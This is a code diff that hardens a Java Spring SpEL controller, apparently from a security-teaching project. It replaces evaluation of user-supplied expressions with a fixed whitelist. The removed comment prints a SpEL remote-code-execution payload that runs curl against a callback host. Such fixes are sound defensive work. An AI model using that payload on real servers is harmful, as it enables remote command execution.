@@ -2,7 +2,6 @@ package org.joychou.controller;
 
 import org.springframework.expression.ConstructorResolver;
 import org.springframework.expression.ExpressionParser;
-import org.springframework.expression.MethodResolver;
 import org.springframework.expression.PropertyAccessor;
 import org.springframework.expression.spel.SpelEvaluationException;
 import org.springframework.expression.spel.SpelMessage;
@@ -25,24 +24,44 @@ import java.util.Collections;
 public class SpEL {
 
     /**
-     * SpEL to RCE
-     * http://localhost:8080/spel/vul/?expression=xxx.
-     * xxx is urlencode(exp)
-     * exp: T(java.lang.Runtime).getRuntime().exec("curl xxx.ceye.io")
+     * Predefined expressions. The "expression" request parameter only selects one of these; the
+     * attacker-supplied data is exposed to the expression solely as the variable #input.
+     * http://localhost:8080/spel/vuln?expression=upper&value=hello
      */
     @GetMapping("/spel/vuln")
-    public String rce(String expression) {
+    public String rce(String expression, String value) {
+        String fixedExpression = selectExpression(expression);
+        if (fixedExpression == null) {
+            return "Bad boy. I got u.";
+        }
         ExpressionParser parser = new SpelExpressionParser();
-        // Restricted context: no type references (T(...)), no constructors, no method calls,
-        // no property/bean access. Only literals and operators are evaluated.
+        // No type references (T(...)), no constructors, no bean/property access.
         StandardEvaluationContext context = new StandardEvaluationContext();
         context.setTypeLocator(typeName -> {
             throw new SpelEvaluationException(SpelMessage.TYPE_NOT_FOUND, typeName);
         });
         context.setConstructorResolvers(Collections.<ConstructorResolver>emptyList());
-        context.setMethodResolvers(Collections.<MethodResolver>emptyList());
         context.setPropertyAccessors(Collections.<PropertyAccessor>emptyList());
-        return HtmlUtils.htmlEscape(String.valueOf(parser.parseExpression(expression).getValue(context)));
+        context.setVariable("input", value == null ? "" : value);
+        return HtmlUtils.htmlEscape(String.valueOf(parser.parseExpression(fixedExpression).getValue(context)));
+    }
+
+    private static String selectExpression(String selector) {
+        if (selector == null) {
+            return null;
+        }
+        switch (selector.trim()) {
+            case "length":
+                return "#input.length()";
+            case "upper":
+                return "#input.toUpperCase()";
+            case "lower":
+                return "#input.toLowerCase()";
+            case "trim":
+                return "#input.trim()";
+            default:
+                return null;
+        }
     }
 
     public static void main(String[] args) {
